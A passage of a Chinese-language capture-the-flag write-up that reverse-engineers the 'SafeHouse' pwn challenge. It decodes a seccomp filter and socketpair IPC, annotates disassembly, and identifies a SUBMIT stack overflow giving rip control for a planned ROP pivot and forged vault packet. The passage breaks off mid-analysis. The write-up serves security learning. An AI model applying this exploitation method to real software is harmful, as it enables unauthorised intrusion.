\texttt{ld}」。 本地 \texttt{pwn7/} 裡沒有附 libc，所以本地是用系統
glibc，遠端版本可能不同 ------ 這題\textbf{不影響}，因為我們完全沒有用到
libc 的位址（gadget 全部來自 binary 自己）。
\end{quote}

遠端開場畫面：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
SafeHouse v1.0
Type HELP.
sh>
\end{Verbatim}

指令表（\texttt{.\allowbreak{}rodata} 裡的字串直接告訴我們）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
cmds: PING HELP NOTE RELAY SUBMIT QUIT
\end{Verbatim}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{2.
程式整體架構}\label{ux7a0bux5f0fux6574ux9ad4ux67b6ux69cb}

\texttt{main} 在 \texttt{0x401290}。它的流程（我對照組語整理）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
socketpair(AF_UNIX, SOCK_STREAM, 0, sv)      ; sv[0], sv[1] 是一對雙向管道
key = hash(getpid())   →  存到 .bss:0x405060 (4 bytes)
fork()
 ├── 父行程（front desk，前台）
 │      close(sv[1])
 │      dup2(sv[0], 3)                       ; 之後用 fd 3 跟保險箱說話
 │      prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)
 │      seccomp(SECCOMP_SET_MODE_FILTER, 0, &prog)
 │      命令迴圈（stdin/stdout 就是我們的 socket）
 └── 子行程（vault，保險箱）
        close(sv[0])
        dup2(sv[1], 3)
        open("/dev/null"); dup2(fd, 0); dup2(fd, 1)   ; 不需要跟人講話
        signal(SIGPIPE, SIG_IGN)
        開 flag.txt，把 fd 放進 fd 槽表 0x405080
        讀 fd 3 的封包 → 解密 → 依 op 分派
\end{Verbatim}

\begin{quote}
※閱讀 \textbf{先解釋兩個 seccomp
相關的常數}（偽碼裡只有名字，很嚇人但其實很單純）： *
\texttt{PR\_\allowbreak{}SET\_\allowbreak{}NO\_\allowbreak{}NEW\_\allowbreak{}PRIVS}（值 = \textbf{38}）是 seccomp
的\textbf{前置條件}：用 \texttt{prctl} 宣告
「我這個行程不會因為執行的程式而取得新權限」（例如 setuid binary）。
核心規定：\textbf{沒有先設這個，就裝不了 seccomp 過濾器。} *
\texttt{SECCOMP\_\allowbreak{}SET\_\allowbreak{}MODE\_\allowbreak{}FILTER}（值 = \textbf{1}）是
\texttt{seccomp()} syscall（編號 \textbf{317}）
的模式參數，意思是「我要裝一組 BPF 過濾器」。 第三個參數 \texttt{\&\allowbreak{}prog}
指向一個 \texttt{sock\_\allowbreak{}fprog} 結構，裡面是「指令數」與「指令陣列」。
\end{quote}

\begin{quote}
※閱讀 標題講的「\textbf{IPC}」在這裡不是什麼高深機制：
就是父行程（前台）與子行程（保險箱）用 \texttt{socketpair} 做出來的那條
\textbf{fd 3 通道}， 兩邊互相傳「4 bytes 標頭 +
payload」的封包。本題的漏洞就是「我們假冒前台，
自己往這條通道塞一個偽造封包」。
\end{quote}

\paragraph{2.1 socketpair 是什麼}\label{socketpair-ux662fux4ec0ux9ebc}

\begin{quote}
※閱讀 \textbf{先定義 \texttt{fd}（file
descriptor，檔案描述元）}：核心給「每一個被打開的檔案／socket／管道」
一個編號，程式就用這個編號讀寫（\texttt{0} = stdin、\texttt{1} =
stdout、\texttt{2} = stderr，之後開的從 \texttt{3} 開始）。
\texttt{open()} 會\textbf{回傳}一個 fd，\texttt{read(fd,\allowbreak{}\ \allowbreak{}…)} /
\texttt{write(fd,\allowbreak{}\ \allowbreak{}…)} / \texttt{pread(fd,\allowbreak{}\ \allowbreak{}…)} 用它當第一個參數。
本題父子行程各自有一份「同一組編號的複製品」（\texttt{fork()} 會複製 fd
表）， \texttt{dup2(sv{[}0{]},\allowbreak{}\ \allowbreak{}3)} 的意思是「把 \texttt{sv{[}0{]}} 這條
socket 複製到編號 3」， 之後兩邊就都用編號 3
講話。這就是為什麼下面會說「flag 的 fd 只在子行程裡」------ 子行程
\texttt{open("flag.\allowbreak{}txt")} 拿到的編號，父行程的 fd 表裡沒有。
\end{quote}

\texttt{socketpair()} 生出\textbf{兩個}互相連通的 fd（\texttt{sv{[}0{]}}
/ \texttt{sv{[}1{]}}）： 寫進 \texttt{sv{[}0{]}} 的資料可以從
\texttt{sv{[}1{]}} 讀出來，反之亦然。

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   父行程 (front desk)                 子行程 (vault)
        fd 3  ──────►  socketpair  ──────►  fd 3
             ◄──────────────────────────────
\end{Verbatim}

因為 \texttt{fork()} 會複製記憶體，\texttt{key}
這個全域變數（\texttt{0x405060}） \textbf{父子兩邊的值一樣} →
兩邊用同一把 key 做 XOR 加解密。

\paragraph{2.2
為什麼要分兩個行程}\label{ux70baux4ec0ux9ebcux8981ux5206ux5169ux500bux884cux7a0b}

因為 flag 檔的 fd \textbf{只存在子行程裡}，父行程拿不到。 而且父行程被
\textbf{seccomp} 鎖住：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
白名單：read, write, close, mmap, mprotect, brk, rt_sigreturn, exit_group
（其他一律 SECCOMP_RET_KILL_PROCESS）
\end{Verbatim}

\texttt{seccomp} 的過濾器是一串固定 8 bytes 的 BPF 指令，每條的欄位是：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
struct sock_filter {           // 每條 8 bytes
    __u16 code;   // 要做什麼（0x20 = LD W ABS, 0x15 = JEQ K, 0x06 = RET K）
    __u8  jt;     // 條件成立時往後跳幾條
    __u8  jf;     // 條件不成立時往後跳幾條
    __u32 k;      // 比較值 / 回傳值
};
\end{Verbatim}

所以 \texttt{service} 裡
\texttt{0x401339}\textasciitilde{}\texttt{0x40146f} 那一堆
\texttt{movabs} + \texttt{mov\ \allowbreak{}{[}rsp+0x4xx{]},\allowbreak{}rax}
就是在\textbf{一條一條把 21 條指令寫到堆疊上}（\texttt{0x401474} 之後是
\texttt{prctl} 與 \texttt{seccomp} 的呼叫， 不再是「寫
filter」；\texttt{{[}rsp+0x20{]}} 是 \texttt{sock\_\allowbreak{}fprog} 的
\texttt{len\ \allowbreak{}=\ \allowbreak{}0x15\ \allowbreak{}=\ \allowbreak{}21}，\texttt{{[}rsp+0x28{]}} 是 filter 指標
\texttt{rsp+0x420}）。 把那些立即數一個一個拆開就是下面那份清單，例如：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
位址
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
立即數
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
拆解
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
意義
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{{[}rsp+0x420{]}} & \texttt{0x0000000400000020} & code=0x20,
jt=0, jf=0, k=4 & \texttt{LD\ \allowbreak{}W\ \allowbreak{}ABS\ \allowbreak{}4}（讀
\texttt{seccomp\_\allowbreak{}data.\allowbreak{}arch}） \\
\texttt{{[}rsp+0x428{]}} & \texttt{0xc000003e00010015} & code=0x15,
jt=1, jf=0, k=0xc000003e &
\texttt{JEQ\ \allowbreak{}AUDIT\_\allowbreak{}ARCH\_\allowbreak{}X86\_\allowbreak{}64}，成立就跳過下一條 \\
\texttt{{[}rsp+0x430{]}} & \texttt{0x8000000000000006} & code=0x06,
k=0x80000000 & \texttt{RET\ \allowbreak{}KILL\_\allowbreak{}PROCESS} \\
\texttt{{[}rsp+0x440{]}} & \texttt{0x0000000001000015} & code=0x15,
jt=0, jf=1, k=0 & \texttt{JEQ\ \allowbreak{}0}（read）→ 成立走下一條
allow，否則跳過 \\
\texttt{{[}rsp+0x448{]}} & \texttt{0x000000007fff0006} & code=0x06,
k=0x7fff0000 & \texttt{RET\ \allowbreak{}ALLOW} \\
\end{longtable}
}

（也可以裝 \texttt{seccomp-\allowbreak{}tools}（Ruby
gem：\texttt{gem\ \allowbreak{}install\ \allowbreak{}seccomp-\allowbreak{}tools}）後跑
\texttt{seccomp-\allowbreak{}tools\ \allowbreak{}dump\ \allowbreak{}./\allowbreak{}service}，它會直接印出可讀的清單。）

我從 \texttt{main} 裡組 filter 的組語手動解出來的 BPF：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
 0: LD  W  ABS  4            ; 讀 arch
 1: JEQ 0xc000003e (x86-64)
 2: RET KILL_PROCESS
 3: LD  W  ABS  0            ; 讀 syscall number
 4: JEQ 0    → allow        ; read
 6: JEQ 1    → allow        ; write
 8: JEQ 3    → allow        ; close
10: JEQ 9    → allow        ; mmap
12: JEQ 0xa  → allow        ; mprotect
14: JEQ 0xc  → allow        ; brk
16: JEQ 0xf  → allow        ; rt_sigreturn
18: JEQ 0xe7 → allow        ; exit_group
20: RET KILL_PROCESS        ; 預設拒絕
\end{Verbatim}

\textbf{沒有 \texttt{execve}、沒有 \texttt{open}/\texttt{openat}。}
所以：

\begin{itemize}
\tightlist
\item
  ✗ 拿到 \texttt{system("/\allowbreak{}bin/\allowbreak{}sh")} 也沒用（\texttt{system} 內部會
  \texttt{fork}+\texttt{execve}，會被殺掉）
\item
  ✗ 不能自己 \texttt{open("flag.\allowbreak{}txt")}
\item
  ✓ \textbf{只能「借保險箱的手」去讀 flag}
\end{itemize}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{3.
前台程式逐段解說}\label{ux524dux53f0ux7a0bux5f0fux9010ux6bb5ux89e3ux8aaa}

\paragraph{\texorpdfstring{3.1 \texttt{main}
的堆疊配置}{3.1 main 的堆疊配置}}\label{main-ux7684ux5806ux758aux914dux7f6e}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401290:  }\BuiltInTok{push} \KeywordTok{r15} \OperatorTok{/} \KeywordTok{r14} \OperatorTok{/} \KeywordTok{r13} \OperatorTok{/} \KeywordTok{r12} \OperatorTok{/} \KeywordTok{rbp} \OperatorTok{/} \KeywordTok{rbx}
\NormalTok{40129e:  }\BuiltInTok{sub}  \KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x1000}
\NormalTok{4012a5:  }\BuiltInTok{or}   \DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{],}\BaseNTok{0x0}      \CommentTok{; 觸碰堆疊，讓 guard page 被配置}
\NormalTok{4012aa:  }\BuiltInTok{sub}  \KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x428}
\NormalTok{...}
\NormalTok{40134b:  }\BuiltInTok{lea}  \KeywordTok{rbp}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x420}\OperatorTok{]}          \CommentTok{; rbp = 輸入緩衝區，範圍 rsp+0x420 \textasciitilde{} rsp+0x81f (共 0x400 bytes)}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  輸入行緩衝區：\texttt{rsp+0x420}，大小 \texttt{0x400} bytes，最多寫
  \texttt{0x3ff} 個字元（留 1 byte 給結尾的
  \texttt{\textbackslash{}\allowbreak{}0}；見下面的讀取迴圈
  \texttt{lea\ \allowbreak{}rbx,{[}rsp+0x81f{]}} 與 \texttt{cmp\ \allowbreak{}rbx,\allowbreak{}r15}）
\item
  \texttt{socketpair} 的結果陣列：\texttt{rsp+0x18}
\item
  \texttt{sub\ \allowbreak{}rsp,\allowbreak{}0x1000} 是為了確保「一次就把 4KB 的堆疊擴張完」，
  避免碰到 guard page（glibc 編譯器常見的
  \texttt{-\allowbreak{}fstack-\allowbreak{}clash-\allowbreak{}protection}）。
\end{itemize}

\paragraph{\texorpdfstring{3.2 讀一行輸入（\texttt{0x4014d0}
\textasciitilde{}
\texttt{0x401530}）}{3.2 讀一行輸入（0x4014d0 \textasciitilde{} 0x401530）}}\label{ux8b80ux4e00ux884cux8f38ux51650x4014d0-0x401530}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{4014d0:  }\BuiltInTok{mov} \KeywordTok{edx}\OperatorTok{,}\DecValTok{4}
\NormalTok{4014d5:  }\BuiltInTok{mov} \KeywordTok{rsi}\OperatorTok{,}\KeywordTok{r12}        \CommentTok{; r12 = 0x4030ba = "sh\textgreater{} "}
\NormalTok{4014d8:  }\BuiltInTok{mov} \KeywordTok{edi}\OperatorTok{,}\DecValTok{1}
\NormalTok{4014dd:  }\BuiltInTok{mov} \KeywordTok{r15}\OperatorTok{,}\KeywordTok{rbp}        \CommentTok{; r15 = rsp+0x420}
\NormalTok{4014e0:  }\ControlFlowTok{call}\NormalTok{ write}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt     }\CommentTok{; write(1, "sh\textgreater{} ", 4)}
\NormalTok{4014e5:  }\ControlFlowTok{jmp} \DecValTok{401503}
\NormalTok{4014f0:  }\BuiltInTok{cmp} \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{r15}\OperatorTok{],}\BaseNTok{0xa}       \CommentTok{; 是 \textquotesingle{}\textbackslash{}n\textquotesingle{} 嗎？}
\NormalTok{4014f4:  }\ControlFlowTok{je}  \DecValTok{4015}\ErrorTok{c0}                   \CommentTok{; 是 → 結束}
\NormalTok{4014fa:  }\BuiltInTok{add} \KeywordTok{r15}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{4014fe:  }\BuiltInTok{cmp} \KeywordTok{rbx}\OperatorTok{,}\KeywordTok{r15}                  \CommentTok{; rbx = rsp+0x81f}
\NormalTok{401501:  }\ControlFlowTok{je}  \DecValTok{401530}
\NormalTok{401503:  }\BuiltInTok{xor} \KeywordTok{edi}\OperatorTok{,}\KeywordTok{edi}
\NormalTok{401505:  }\BuiltInTok{mov} \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{40150a:  }\BuiltInTok{mov} \KeywordTok{rsi}\OperatorTok{,}\KeywordTok{r15}
\NormalTok{40150d:  }\ControlFlowTok{call}\NormalTok{ read}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt                }\CommentTok{; read(0, r15, 1)  一次讀 1 byte}
\NormalTok{401512:  }\BuiltInTok{test} \KeywordTok{rax}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{401515:  }\ControlFlowTok{jg}  \DecValTok{4014}\ErrorTok{f0}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  一次讀 1 byte 直到 \texttt{\textbackslash{}\allowbreak{}n}，把
  \texttt{\textbackslash{}\allowbreak{}n} 換成 \texttt{\textbackslash{}\allowbreak{}0}。
\item
  \textbf{這個寫法允許輸入任意二進位 byte}（包括
  \texttt{\textbackslash{}\allowbreak{}x00} 以外的所有值）。 對我們很重要：之後要塞
  \texttt{0x401f07} 這種非 ASCII bytes。
\item
  最大長度 \texttt{0x81f-\allowbreak{}0x420\ \allowbreak{}=\ \allowbreak{}0x3ff}。
\end{itemize}

\paragraph{3.3 命令分派}\label{ux547dux4ee4ux5206ux6d3e}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401538:  }\BuiltInTok{cmp} \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x420}\OperatorTok{],}\BaseNTok{0x20}     \CommentTok{; 開頭是空白嗎？}
\NormalTok{401543:  }\ControlFlowTok{jne} \DecValTok{401552}
\NormalTok{401548:  }\BuiltInTok{add} \KeywordTok{r15}\OperatorTok{,}\BaseNTok{0x1}                       \CommentTok{; 跳過開頭空白}
\NormalTok{40154c:  }\BuiltInTok{cmp} \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{r15}\OperatorTok{],}\BaseNTok{0x20}
\NormalTok{401550:  }\ControlFlowTok{je}  \DecValTok{401548}
\NormalTok{401552:  ...strncmp}\OperatorTok{(}\KeywordTok{r15}\OperatorTok{,} \StringTok{"PING"}\OperatorTok{,} \DecValTok{4}\OperatorTok{)...}
\end{Highlighting}
\end{Shaded}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}llll@{}}
\toprule\noalign{}
命令 & 字串位址 & 處理函式 & 功能 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{PING} & \texttt{0x4030bf} & \texttt{0x4015d0} & 回
\texttt{PONG\textbackslash{}\allowbreak{}n} \\
\texttt{HELP} & \texttt{0x4030ca} & \texttt{0x401628} & 印指令表 \\
\texttt{NOTE} & \texttt{0x4030cf} & \texttt{0x401643} & 把文字寫進
\texttt{.\allowbreak{}bss} 的筆記區 \\
\texttt{RELAY} & \texttt{0x4030ff} & \texttt{0x401f70} & 送
op=1\textasciitilde4 給保險箱，把回覆印出來 \\
\texttt{SUBMIT} & \texttt{0x403105} & \texttt{0x401ed0} &
\textbf{溢位點} \\
\texttt{QUIT} & \texttt{0x40310c} & \texttt{0x40174e} & 離開 \\
\end{longtable}
}

\paragraph{\texorpdfstring{3.4 \texttt{NOTE}（\texttt{0x401643}）---
我們唯一的「已知位址可寫區」}{3.4 NOTE（0x401643）--- 我們唯一的「已知位址可寫區」}}\label{note0x401643-ux6211ux5011ux552fux4e00ux7684ux5df2ux77e5ux4f4dux5740ux53efux5bebux5340}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401643:  }\BuiltInTok{mov}  \KeywordTok{rsi}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x8}\OperatorTok{]}     \CommentTok{; \&endptr}
\NormalTok{401648:  }\BuiltInTok{lea}  \KeywordTok{rdi}\OperatorTok{,[}\KeywordTok{r15}\OperatorTok{+}\BaseNTok{0x5}\OperatorTok{]}     \CommentTok{; 參數: "\textless{}idx\textgreater{} \textless{}text\textgreater{}"}
\NormalTok{40164c:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0xa}
\NormalTok{401651:  }\ControlFlowTok{call}\NormalTok{ strtol}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt        }\CommentTok{; idx = strtol(...)}
\NormalTok{401656:  }\BuiltInTok{cmp}  \KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x7}
\NormalTok{40165a:  }\ControlFlowTok{ja}   \DecValTok{401718}            \CommentTok{; idx \textgreater{} 7 → "ERR bad idx"}
\NormalTok{...}
\NormalTok{40167e:  }\BuiltInTok{shl}  \KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x6}           \CommentTok{; idx * 0x40}
\NormalTok{401682:  }\BuiltInTok{lea}  \KeywordTok{rdx}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x8af7}\OperatorTok{]}  \CommentTok{; rdx = 0x40a180}
\NormalTok{401689:  }\BuiltInTok{lea}  \KeywordTok{rcx}\OperatorTok{,[}\KeywordTok{rax}\OperatorTok{+}\KeywordTok{rdx}\OperatorTok{*}\DecValTok{1}\OperatorTok{]}   \CommentTok{; 目的 = 0x40a180 + idx*0x40}
\NormalTok{40168d:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x3f}
\NormalTok{401692:  }\BuiltInTok{mov}  \KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rcx}
\NormalTok{401695:  }\ControlFlowTok{call}\NormalTok{ strncpy}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt       }\CommentTok{; strncpy(dst, text, 0x3f)}
\NormalTok{4016ab:  }\BuiltInTok{mov}  \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{+}\BaseNTok{0x3f}\OperatorTok{],}\BaseNTok{0x0}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  筆記區：\texttt{0x40a180}，8 格 × \texttt{0x40} bytes =
  \texttt{0x40a180} \textasciitilde{} \texttt{0x40a37f}
\item
  \texttt{strncpy} 會把沒填滿的部分\textbf{補
  \texttt{\textbackslash{}\allowbreak{}0}}
\item
  所以只要送 3 個 byte，就能寫出完整的 8-byte 位址（高位自動為 0）
\item
  這是我們唯一「有固定位址、可以放大 ROP 鏈」的可寫區域 → 非常關鍵，因為
  \texttt{.\allowbreak{}bss} 其他地方我們碰不到，而堆疊位址未知
\end{itemize}

\paragraph{\texorpdfstring{3.5 \texttt{SUBMIT}（\texttt{0x401ed0}）---
漏洞點}{3.5 SUBMIT（0x401ed0）--- 漏洞點}}\label{submit0x401ed0-ux6f0fux6d1eux9ede}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401ed0:  }\BuiltInTok{test} \KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rdi}
\NormalTok{401ed3:  }\ControlFlowTok{je}   \DecValTok{401}\ErrorTok{f58}                 \CommentTok{; 沒參數 → "ERR usage: SUBMIT \textless{}size\textgreater{}"}
\NormalTok{401ed9:  }\BuiltInTok{push} \KeywordTok{rbx}
\NormalTok{401eda:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0xa}
\NormalTok{401edf:  }\BuiltInTok{xor}  \KeywordTok{esi}\OperatorTok{,}\KeywordTok{esi}
\NormalTok{401ee1:  }\BuiltInTok{sub}  \KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x40}               \CommentTok{; ← 只有 0x40 bytes 的區域變數！}
\NormalTok{401ee5:  }\ControlFlowTok{call}\NormalTok{ strtol}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt             }\CommentTok{; rax = size}
\NormalTok{401eea:  }\BuiltInTok{mov}  \KeywordTok{rbx}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{401eed:  }\BuiltInTok{test} \KeywordTok{al}\OperatorTok{,}\KeywordTok{al}
\NormalTok{401eef:  }\ControlFlowTok{je}   \DecValTok{401}\ErrorTok{f38}                 \CommentTok{; 低位元組為 0 → "ERR bad size"}
\NormalTok{401ef1:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x3}
\NormalTok{401ef6:  }\BuiltInTok{lea}  \KeywordTok{rsi}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x112f}\OperatorTok{]}       \CommentTok{; "GO\textbackslash{}n"}
\NormalTok{401efd:  }\BuiltInTok{mov}  \KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{401f02:  }\ControlFlowTok{call}\NormalTok{ write}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt              }\CommentTok{; write(1, "GO\textbackslash{}n", 3)}
\NormalTok{401f07:  }\BuiltInTok{xor}  \KeywordTok{edi}\OperatorTok{,}\KeywordTok{edi}                \CommentTok{; ← 這個位址待會要當 pivot 目標用}
\NormalTok{401f09:  }\BuiltInTok{movzx} \KeywordTok{edx}\OperatorTok{,}\KeywordTok{bl}                \CommentTok{; 長度 = size 的低 8 bits（0\textasciitilde{}255）}
\NormalTok{401f0c:  }\BuiltInTok{mov}  \KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rsp}                \CommentTok{; 目的 = rsp}
\NormalTok{401f0f:  }\ControlFlowTok{call}\NormalTok{ read}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt               }\CommentTok{; read(0, rsp, bl)}
\NormalTok{401f14:  }\BuiltInTok{test} \KeywordTok{rax}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{401f17:  }\ControlFlowTok{jle}  \DecValTok{401}\ErrorTok{f2f}
\NormalTok{401f19:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,}\DecValTok{3}
\NormalTok{401f1e:  }\BuiltInTok{lea}  \KeywordTok{rsi}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x110b}\OperatorTok{]}       \CommentTok{; "OK\textbackslash{}n"}
\NormalTok{401f25:  }\BuiltInTok{mov}  \KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{401f2a:  }\ControlFlowTok{call}\NormalTok{ write}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt              }\CommentTok{; write(1, "OK\textbackslash{}n", 3)}
\NormalTok{401f2f:  }\BuiltInTok{add}  \KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x40}
\NormalTok{401f33:  }\BuiltInTok{pop}  \KeywordTok{rbx}
\NormalTok{401f34:  }\ControlFlowTok{ret}
\end{Highlighting}
\end{Shaded}

\textbf{漏洞：\texttt{read(0,\allowbreak{}\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}bl)} 寫進只有 0x40 bytes
的緩衝區。} \texttt{bl} 最大 255，所以最多可以寫 255 bytes。

堆疊佈局：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
rsp + 0x00  ┌────────────────────────┐
            │  0x40 bytes 緩衝區     │  ← read 的目標
rsp + 0x40  ├────────────────────────┤
            │  saved rbx             │  ← pop rbx 會讀這裡
rsp + 0x48  ├────────────────────────┤
            │  return address        │  ← ret 會跳這裡
rsp + 0x50  └────────────────────────┘
\end{Verbatim}

→ \textbf{offset \texttt{0x48} 就能控制 \texttt{rip}；offset
\texttt{0x40} 控制 \texttt{rbx}。}

\paragraph{\texorpdfstring{3.6 \texttt{RELAY}（\texttt{0x401f70}）---
跟保險箱要資料}{3.6 RELAY（0x401f70）--- 跟保險箱要資料}}\label{relay0x401f70-ux8ddfux4fddux96aaux7bb1ux8981ux8cc7ux6599}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401f70:  ...}
\NormalTok{401f88:  }\ControlFlowTok{call}\NormalTok{ strtol}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt             }\CommentTok{; op = strtol(arg)}
\NormalTok{401f8d:  }\BuiltInTok{lea}  \KeywordTok{rdx}\OperatorTok{,[}\KeywordTok{rax}\OperatorTok{{-}}\BaseNTok{0x1}\OperatorTok{]}
\NormalTok{401f91:  }\BuiltInTok{cmp}  \KeywordTok{rdx}\OperatorTok{,}\BaseNTok{0x3}
\NormalTok{401f95:  }\ControlFlowTok{ja}   \DecValTok{402060}                 \CommentTok{; op 必須是 1\textasciitilde{}4}
\NormalTok{...}
\NormalTok{401fa6:  }\BuiltInTok{mov}  \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0xc}\OperatorTok{],}\KeywordTok{al}         \CommentTok{; 標頭 byte0 = op}
\NormalTok{401faa:  }\BuiltInTok{mov}  \KeywordTok{esi}\OperatorTok{,}\BaseNTok{0x4}
\NormalTok{401faf:  }\BuiltInTok{mov}  \KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rcx}
\NormalTok{401fb2:  }\BuiltInTok{xor}  \KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}                       \CommentTok{; ✶ 這裡把 rax 整個歸零}
\NormalTok{401fb4:  }\BuiltInTok{mov}  \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0xf}\OperatorTok{],}\BaseNTok{0x0}        \CommentTok{; 標頭 byte3 = pad = 0}
\NormalTok{401fb9:  }\BuiltInTok{lea}  \KeywordTok{rbx}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x10}\OperatorTok{]}                \CommentTok{; rbx = 接收緩衝區起點 = rsp+0x10}
\NormalTok{401fbe:  }\BuiltInTok{mov}  \DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0xd}\OperatorTok{],}\KeywordTok{ax}         \CommentTok{; ← ax 此時是 0（因為上一條 xor eax,eax）}
                                            \CommentTok{;   標頭 byte1..2 = 0x0000  (長度 = 0)}
\NormalTok{401fc3:  }\ControlFlowTok{call} \BaseNTok{0x401be0}                      \CommentTok{; XOR 加密 4 bytes}
\NormalTok{401fc8:  }\BuiltInTok{mov}  \KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rcx}
\NormalTok{401fcb:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x4}
\NormalTok{401fd0:  }\BuiltInTok{mov}  \KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x3}
\NormalTok{401fd5:  }\ControlFlowTok{call}\NormalTok{ write}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt                     }\CommentTok{; write(3, header, 4) 送給保險箱}
\NormalTok{401fda:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x100}                     \CommentTok{; ← 這個位址我們等一下要用}
\NormalTok{401fdf:  }\BuiltInTok{mov}  \KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rbx}                       \CommentTok{; rbx = rsp+0x10}
\NormalTok{401fe2:  }\BuiltInTok{mov}  \KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x3}
